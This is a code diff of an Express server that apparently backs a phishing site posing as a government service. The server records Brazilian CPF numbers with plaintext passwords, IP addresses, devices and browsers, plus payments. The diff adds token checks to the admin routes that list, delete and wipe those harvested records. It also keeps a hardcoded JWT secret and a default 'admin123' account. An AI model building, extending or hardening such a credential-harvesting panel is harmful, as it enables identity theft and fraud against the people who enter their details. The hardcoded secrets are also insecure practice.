@@ -85,12 +85,33 @@ pool.query(`
         if (adminExists.rows.length === 0) {
             const hash = await bcrypt.hash('admin123', 10);
             await pool.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['admin', hash]);
-            console.log('✅ Admin criado: admin / admin123');
+            console.log('Admin criado: null');
         }
     } catch(e) {}
 })();
 
 const JWT_SECRET = 'gov_secret_2024';
+
+// ============ MIDDLEWARE PARA VERIFICAR TOKEN ADMIN ============
+function verificarAdminToken(req, res, next) {
+    // Pega o token do header Authorization
+    const authHeader = req.headers.authorization;
+    const token = authHeader && authHeader.split(' ')[1];
+    
+    if (!token) {
+        return res.status(401).json({ error: 'Token nao fornecido' });
+    }
+    
+    try {
+        const decoded = jwt.verify(token, JWT_SECRET);
+        if (decoded.username !== 'admin') {
+            return res.status(403).json({ error: 'Acesso negado' });
+        }
+        next();
+    } catch (error) {
+        return res.status(401).json({ error: 'Token invalido ou expirado' });
+    }
+}
 
 // Rota CPF
 app.post('/api/cpf', async (req, res) => {
@@ -152,7 +173,7 @@ app.post('/api/admin/logout', (req, res) => {
 });
 
 // Estatísticas
-app.get('/api/admin/stats', async (req, res) => {
+app.get('/api/admin/stats', verificarAdminToken, async (req, res) => {
     try {
         const totalUsers = await pool.query('SELECT COUNT(*) FROM users');
         const comSenha = await pool.query("SELECT COUNT(*) FROM users WHERE senha IS NOT NULL");
@@ -168,7 +189,7 @@ app.get('/api/admin/stats', async (req, res) => {
 });
 
 // Listar usuários
-app.get('/api/admin/users', async (req, res) => {
+app.get('/api/admin/users', verificarAdminToken, async (req, res) => {
     try {
         const result = await pool.query('SELECT cpf, senha, ip, dispositivo, navegador, data_cpf, data_senha FROM users ORDER BY data_cpf DESC');
         res.json({ users: result.rows });
@@ -178,7 +199,7 @@ app.get('/api/admin/users', async (req, res) => {
 });
 
 // Listar logs
-app.get('/api/admin/logs', async (req, res) => {
+app.get('/api/admin/logs', verificarAdminToken, async (req, res) => {
     try {
         const result = await pool.query('SELECT tipo, cpf, senha, ip, dispositivo, navegador, data FROM logs ORDER BY data DESC LIMIT 200');
         res.json({ logs: result.rows });
@@ -188,7 +209,7 @@ app.get('/api/admin/logs', async (req, res) => {
 });
 
 // Listar pagamentos (admin)
-app.get('/api/admin/payments', async (req, res) => {
+app.get('/api/admin/payments', verificarAdminToken, async (req, res) => {
     try {
         const result = await pool.query('SELECT * FROM payments ORDER BY id DESC');
         res.json({ payments: result.rows });
@@ -199,7 +220,7 @@ app.get('/api/admin/payments', async (req, res) => {
 });
 
 // Deletar usuário
-app.delete('/api/admin/delete/:cpf', async (req, res) => {
+app.delete('/api/admin/delete/:cpf', verificarAdminToken, async (req, res) => {
     try {
         await pool.query('DELETE FROM users WHERE cpf = $1', [req.params.cpf]);
         res.json({ success: true });
@@ -209,7 +230,7 @@ app.delete('/api/admin/delete/:cpf', async (req, res) => {
 });
 
 // Limpar dados
-app.post('/api/admin/clear', async (req, res) => {
+app.post('/api/admin/clear', verificarAdminToken, async (req, res) => {
     try {
         await pool.query('DELETE FROM users');
         await pool.query('DELETE FROM logs');
@@ -220,7 +241,7 @@ app.post('/api/admin/clear', async (req, res) => {
 });
 
 // Alterar senha admin (com verificação da senha antiga)
-app.post('/api/admin/change-password', async (req, res) => {
+app.post('/api/admin/change-password', verificarAdminToken, async (req, res) => {
     const { senha_antiga, nova_senha } = req.body;
     
     if (!senha_antiga || !nova_senha || nova_senha.length < 6) {
